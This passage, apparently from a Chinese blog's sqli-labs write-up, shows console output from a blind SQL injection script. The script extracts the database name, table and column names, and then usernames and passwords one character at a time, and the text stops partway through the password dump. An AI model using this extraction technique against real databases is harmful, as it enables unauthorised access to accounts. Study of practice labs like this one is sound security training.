class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: s<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: se<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: sec<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: secu<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: secur<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: securi<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: securit<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: security<br>[+] 数据库名: security<br>[+] 表数量: <span class="hljs-number">4</span><br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: e<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: em<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: ema<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: emai<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: email<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: emails<br>[+] 表名: emails<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: r<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: re<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: ref<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: refe<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: refer<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: refere<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: referer<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: referers<br>[+] 表名: referers<br>[+] 长度为: <span class="hljs-number">7</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: u<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ua<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: uag<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: uage<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: uagen<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: uagent<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: uagents<br>[+] 表名: uagents<br>[+] 长度为: <span class="hljs-number">5</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: u<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: us<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: use<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: user<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: users<br>[+] 表名: users<br>[+] 获取users表的字段...<br>[+] 字段数量: <span class="hljs-number">3</span><br>[+] 长度为: <span class="hljs-number">2</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: i<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: id<br>[+] 字段名: id<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: u<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: us<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: use<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: user<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: usern<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: userna<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: usernam<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: username<br>[+] 字段名: username<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: p<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: pa<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: pas<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: pass<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: passw<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: passwo<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: passwor<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: password<br>[+] 字段名: password<br>[+] 获取users表的数据...<br>[+] 获取字段: username<br>[+] 数据条数: <span class="hljs-number">13</span><br>[+] 长度为: <span class="hljs-number">4</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: d<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: du<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: dum<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: dumb<br>[+] 数据[<span class="hljs-number">1</span>]: dumb<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: an<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: ang<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: ange<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: angel<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: angeli<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: angelin<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: angelina<br>[+] 数据[<span class="hljs-number">2</span>]: angelina<br>[+] 长度为: <span class="hljs-number">5</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: d<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: du<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: dum<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: dumm<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: dummy<br>[+] 数据[<span class="hljs-number">3</span>]: dummy<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: s<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: se<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: sec<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: secu<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: secur<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: secure<br>[+] 数据[<span class="hljs-number">4</span>]: secure<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: s<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: st<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: stu<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: stup<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: stupi<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: stupid<br>[+] 数据[<span class="hljs-number">5</span>]: stupid<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: s<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: su<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: sup<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: supe<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: super<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: superm<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: superma<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: superman<br>[+] 数据[<span class="hljs-number">6</span>]: superman<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: b<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ba<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: bat<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: batm<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: batma<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: batman<br>[+] 数据[<span class="hljs-number">7</span>]: batman<br>[+] 长度为: <span class="hljs-number">5</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 数据[<span class="hljs-number">8</span>]: admin<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin1<br>[+] 数据[<span class="hljs-number">9</span>]: admin1<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin2<br>[+] 数据[<span class="hljs-number">10</span>]: admin2<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin3<br>[+] 数据[<span class="hljs-number">11</span>]: admin3<br>[+] 长度为: <span class="hljs-number">7</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: d<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: dh<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: dha<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: dhak<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: dhakk<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: dhakka<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: dhakkan<br>[+] 数据[<span class="hljs-number">12</span>]: dhakkan<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin4<br>[+] 数据[<span class="hljs-number">13</span>]: admin4<br>[+] 获取字段: password<br>[+] 数据条数: <span class="hljs-number">13</span><br>[+] 长度为: <span class="hljs-number">4</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: d<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: du<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: dum<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: dumb<br>[+] 数据[<span class="hljs-number">1</span>]: dumb<br>[+] 长度为: <span class="hljs-number">10</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: i<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: i-<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: i-k<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: i-ki<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: i-kil<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: i-kill<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: i-kill-<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: i-kill-y<br>[+] 获取第 <span class="hljs-number">9</span> 个字符...<br>[+] 当前结果: i-kill-yo<br>[+] 获取第 <span class="hljs-number">10</span> 个字符...<br>[+] 当前结果: i-kill-you<br>[+] 数据[<span class="hljs-number">2</span>]: i-kill-you<br>[+] 长度为: <span class="hljs-number">8</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: p<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: p@<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: p@s<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: p@ss<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: p@ssw<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: p@sswo<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: p@sswor<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: p@ssword<br>[+] 数据[<span class="hljs-number">3</span>]: p@ssword<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: c<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: cr<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: cra<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: crap<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: crapp<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: crappy<br>[+] 数据[<span class="hljs-number">4</span>]: crappy<br>[+] 长度为: <span class="hljs-number">9</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: s<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: st<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: stu<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: stup<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: stupi<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: stupid<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: stupidi<br>[+] 获取第 <span class="hljs-number">8</span> 个字符...<br>[+] 当前结果: stupidit<br>[+] 获取第 <span class="hljs-number">9</span> 个字符...<br>[+] 当前结果: stupidity<br>[+] 数据[<span class="hljs-number">5</span>]: stupidity<br>[+] 长度为: <span class="hljs-number">7</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: g<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ge<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: gen<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: geni<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: genio<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: geniou<br>[+] 获取第 <span class="hljs-number">7</span> 个字符...<br>[+] 当前结果: genious<br>[+] 数据[<span class="hljs-number">6</span>]: genious<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: m<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: mo<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: mob<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: mob!<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: mob!l<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: mob!le<br>[+] 数据[<span class="hljs-number">7</span>]: mob!le<br>[+] 长度为: <span class="hljs-number">5</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 数据[<span class="hljs-number">8</span>]: admin<br>[+] 长度为: <span class="hljs-number">6</span><br>[+] 获取第 <span class="hljs-number">1</span> 个字符...<br>[+] 当前结果: a<br>[+] 获取第 <span class="hljs-number">2</span> 个字符...<br>[+] 当前结果: ad<br>[+] 获取第 <span class="hljs-number">3</span> 个字符...<br>[+] 当前结果: adm<br>[+] 获取第 <span class="hljs-number">4</span> 个字符...<br>[+] 当前结果: admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: 